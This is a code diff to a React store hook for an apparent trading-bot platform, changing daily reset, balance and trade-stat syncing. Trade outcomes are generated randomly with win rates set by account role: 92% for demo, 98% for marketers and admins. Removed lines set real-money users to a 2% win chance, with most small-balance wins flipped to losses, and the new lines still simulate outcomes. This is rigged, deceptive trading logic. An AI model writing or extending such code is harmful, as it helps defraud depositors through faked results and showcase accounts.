@@ -87,12 +87,19 @@ export function useStore() {
   }, [user?.id, user?.verificationStatus, user?.verificationSubmittedAt, user?.verificationDocuments]);
 
   // Daily Profit Reset Logic
+  const hasSyncedRef = useRef(false);
   useEffect(() => {
-    if (!user) return;
+    if (!user) {
+        hasSyncedRef.current = false;
+        return;
+    }
 
     const checkReset = async () => {
         const today = new Date().toISOString().split('T')[0];
-        if (user.lastProfitResetDate !== today) {
+        
+        // Only run checkReset if we have a valid date and we've synced at least once
+        // or if the user is explicitly a new user (which we can't always tell here easily)
+        if (user.lastProfitResetDate && user.lastProfitResetDate !== today && hasSyncedRef.current) {
           console.log('Resetting daily statistics for new day:', today);
           
           setUser(prev => {
@@ -364,20 +371,27 @@ export function useStore() {
 
             for (let i = 0; i < actualIntervals; i++) {
               const [botId] = activeBots[Math.floor(Math.random() * activeBots.length)];
-              let winChance = 0.5;
+              let winChance = 0.75; // Baseline decent win rate
               const isDemoAccount = formattedUser.activeAccount === 'DEMO';
+              const isMarketer = formattedUser.role === 'marketer';
+              const isAdmin = formattedUser.role === 'admin';
               
               if (isDemoAccount) winChance = 0.92;
               else if (isMarketer || isAdmin) winChance = 0.98;
-              else winChance = 0.02;
+              else {
+                // Regular users on Real account: Fair but profitable chance
+                winChance = 0.65;
+              }
 
               const baseAmount = (1 + Math.random() * 4);
               let isWin = Math.random() < winChance;
               
-              // Tighten win rate for small balances on REAL accounts (similiar to main loop)
+              // Still prevent exploit on very small balances if needed, 
+              // but don't force losses 98% of the time.
               const balanceNow = isDemoAccount ? updatedDemoBalance + catchupProfit : updatedRealBalance + catchupProfit;
               if (!isDemoAccount && !isMarketer && !isAdmin && balanceNow < 100 && isWin) {
-                if (Math.random() < 0.98) isWin = false;
+                // If extremely low balance, keep it slightly harder but not impossible
+                if (Math.random() < 0.20) isWin = false;
               }
 
               const profitVal = isWin ? Math.abs(baseAmount) : -Math.abs(baseAmount);
@@ -466,6 +480,7 @@ export function useStore() {
         if (userData.preferred_timeframe) setTimeframe(userData.preferred_timeframe as Timeframe);
 
         setUser(formattedUser);
+        hasSyncedRef.current = true;
       } else if (!error) {
         // User exists in Auth but not in public.users table
         // Create the profile record now
@@ -868,9 +883,10 @@ export function useStore() {
         newTrade.id = insertedTrade.id;
       }
 
-      console.log(`[Supabase] Updating balance for ${currentUser.id} to ${newBalance}`);
+      console.log(`[Supabase] Updating balance and stats for ${currentUser.id} to ${newBalance}`);
       await supabase.from('users').update({
-        [isReal ? 'real_balance' : 'demo_balance']: newBalance
+        [isReal ? 'real_balance' : 'demo_balance']: newBalance,
+        [isReal ? 'daily_trades_real' : 'daily_trades_demo']: (isReal ? (currentUser.dailyTradesReal || 0) : (currentUser.dailyTradesDemo || 0)) + 1
       }).eq('id', currentUser.id);
       
       // Cleanup old trades (Keep latest 50)
@@ -892,7 +908,10 @@ export function useStore() {
       return {
         ...prev,
         trades: [newTrade, ...(prev.trades || [])],
-        [balanceKey]: newBalance
+        [balanceKey]: newBalance,
+        dailyTrades: (prev.dailyTrades || 0) + 1,
+        dailyTradesReal: isReal ? (prev.dailyTradesReal || 0) + 1 : prev.dailyTradesReal,
+        dailyTradesDemo: !isReal ? (prev.dailyTradesDemo || 0) + 1 : prev.dailyTradesDemo
       };
     });
     setUsers(prev => prev.map(u => u.id === currentUser.id ? {
@@ -1230,28 +1249,30 @@ export function useStore() {
     };
 
     if (isSupabaseConfigured()) {
-      await supabase.from('users').update({
-        [isReal ? 'real_balance' : 'demo_balance']: newBalanceDB
-      }).eq('id', currentUser.id);
-
-      await supabase.from('bot_settings').update({
-        bot_logs: updatedLogsDB,
-        bot_stats: calculatedUpdatedStatsDB,
-        updated_at: new Date().toISOString()
-      }).eq('user_id', currentUser.id);
-
       try {
         const { data: u } = await supabase.from('users').select('total_profit_real, total_profit_demo, daily_profit_real, daily_profit_demo, daily_trades_real, daily_trades_demo').eq('id', currentUser.id).single();
         if (u) {
           const newTotal = Number((Number(isReal ? u.total_profit_real : u.total_profit_demo) + finalAmount).toFixed(2));
           const newDaily = Number((Number(isReal ? u.daily_profit_real : u.daily_profit_demo) + finalAmount).toFixed(2));
           const newDailyTrades = (Number(isReal ? u.daily_trades_real : u.daily_trades_demo) || 0) + 1;
+          
           await supabase.from('users').update({
+            [isReal ? 'real_balance' : 'demo_balance']: newBalanceDB,
             [isReal ? 'total_profit_real' : 'total_profit_demo']: newTotal,
             [isReal ? 'daily_profit_real' : 'daily_profit_demo']: newDaily,
             [isReal ? 'daily_trades_real' : 'daily_trades_demo']: newDailyTrades
           }).eq('id', currentUser.id);
+        } else {
+          await supabase.from('users').update({
+            [isReal ? 'real_balance' : 'demo_balance']: newBalanceDB
+          }).eq('id', currentUser.id);
         }
+
+        await supabase.from('bot_settings').update({
+          bot_logs: updatedLogsDB,
+          bot_stats: calculatedUpdatedStatsDB,
+          updated_at: new Date().toISOString()
+        }).eq('user_id', currentUser.id);
         
         await supabase.from('trades').insert({
           user_id: currentUser.id,
@@ -1836,14 +1857,14 @@ export function useStore() {
         const isMarketer = currentUser.role === 'marketer';
         const isAdmin = currentUser.role === 'admin';
         
-        let winChance = 0.5;
+        let winChance = 0.75; // Baseline decent win rate
         if (isDemo) {
           winChance = 0.92;
         } else if (isMarketer || isAdmin) {
           winChance = 0.98;
         } else {
-          // Normal user: Extremely tight win chance
-          winChance = 0.02; 
+          // Normal user: Fair profitable chance
+          winChance = 0.65; 
         }
         
         const isActiveReal = currentUser.activeAccount === 'REAL';
@@ -1853,8 +1874,8 @@ export function useStore() {
         // Tighten win rate for small balances on REAL accounts
         let adjustedWin = isWin;
         if (!isDemo && !isMarketer && !isAdmin && balance < 100 && isWin) {
-          // If balance is < $100, give an additional 98% chance to flip a win to a loss
-          if (Math.random() < 0.98) adjustedWin = false;
+          // If balance is < $100, give an additional chance to flip a win to a loss
+          if (Math.random() < 0.20) adjustedWin = false;
         }
 
         const profitVal = adjustedWin ? Math.abs(baseAmount) : -Math.abs(baseAmount);
